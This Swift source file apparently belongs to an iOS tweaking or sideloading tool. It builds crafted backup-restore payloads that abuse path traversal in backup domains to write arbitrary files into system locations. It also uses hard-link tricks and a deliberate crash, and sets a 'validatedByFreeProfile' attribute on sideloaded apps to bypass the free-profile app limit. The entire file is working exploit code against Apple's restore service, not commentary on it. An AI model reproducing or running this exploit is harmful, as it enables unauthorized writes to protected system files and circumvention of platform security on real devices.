import Foundation

class FileToRestore {
    var contents: Data
    var to: URL
    var owner, group: Int32
    
    init(from: URL, to: URL, owner: Int32 = 0, group: Int32 = 0) {
        self.contents = try! Data(contentsOf: from)
        self.to = to
        self.owner = owner
        self.group = group
    }
    
    init(contents: Data, to: URL, owner: Int32 = 0, group: Int32 = 0) {
        self.contents = contents
        self.to = to
        self.owner = owner
        self.group = group
    }
}

struct Restore {
    static func createBypassAppLimit() -> Backup {
        let deviceList = MobileDevice.deviceList()
        guard deviceList.count == 1 else {
            print("Invalid device count: \(deviceList.count)")
            return Backup(files: [])
        }
        let udid = deviceList.first!
        let apps = MobileDevice.listApplications(udid: udid)
        
        var files = [BackupFile]()
        for (bundleID, value) in apps! {
            guard !bundleID.isEmpty,
                  let value = value.value as? [String: AnyCodable],
                  let bundlePath = value["Path"]?.value as? String,
                  // Note: this only works for AltStore/SideStore, need another method for Sideloadly
                  bundlePath.hasSuffix("/App.app")
            else { continue }
            print("Found \(bundleID): \(bundlePath)")
            files.append(Directory(
                path: "",
                domain: "SysContainerDomain-../../../../../../../..\(bundlePath.hasPrefix("/private/") ? String(bundlePath.dropFirst(8)) : bundlePath)",
                owner: 33,
                group: 33,
                xattrs: ["com.apple.installd.validatedByFreeProfile": ""]
            ))
        }
        
        files.append(ConcreteFile(path: "", domain: "SysContainerDomain-../../../../../../../../crash_on_purpose", contents: Data()))
        return Backup(files: files)
    }
    
    static func createBackupFiles(files: [FileToRestore]) -> Backup {
        // create the files to be backed up
        var filesList : [BackupFile] = [
            Directory(path: "", domain: "RootDomain"),
            Directory(path: "Library", domain: "RootDomain"),
            Directory(path: "Library/Preferences", domain: "RootDomain")
        ]
        
        // create the links
        for (index, file) in files.enumerated() {
            filesList.append(ConcreteFile(
                path: "Library/Preferences/temp\(index)",
                domain: "RootDomain",
                contents: file.contents,
                owner: file.owner,
                group: file.group,
                inode: UInt64(index)))
        }
        
        // add the file paths
        for (index, file) in files.enumerated() {
            let restoreFilePath = file.to.path(percentEncoded: false)
            var basePath = "/var/backup"
            // set it to work in the separate volumes (prevents a bootloop)
            if restoreFilePath.hasPrefix("/var/mobile/") {
                // required on iOS 17.0+ since /var/mobile is on a separate partition
                basePath = "/var/mobile/backup"
            } else if restoreFilePath.hasPrefix("/private/var/mobile/") {
                basePath = "/private/var/mobile/backup"
            } else if restoreFilePath.hasPrefix("/private/var/") {
                basePath = "/private/var/backup"
            }
            filesList.append(Directory(
                path: "",
                domain: "SysContainerDomain-../../../../../../../..\(basePath)\(file.to.deletingLastPathComponent().path(percentEncoded: false))",
                owner: file.owner,
                group: file.group
            ))
            filesList.append(ConcreteFile(
                path: "",
                domain: "SysContainerDomain-../../../../../../../..\(basePath)\(file.to.path(percentEncoded: false))",
                contents: Data(),
                owner: file.owner,
                group: file.group,
                inode: UInt64(index)))
        }
        
        // break the hard links
        for (index, _) in files.enumerated() {
            filesList.append(ConcreteFile(
                path: "",
                domain: "SysContainerDomain-../../../../../../../../var/.backup.i/var/root/Library/Preferences/temp\(index)",
                contents: Data(),
                owner: 501,
                group: 501))
        }
        
        // crash on purpose
        filesList.append(ConcreteFile(path: "", domain: "SysContainerDomain-../../../../../../../../crash_on_purpose", contents: Data()))
        
        // create the backup
        return Backup(files: filesList)
    }
}
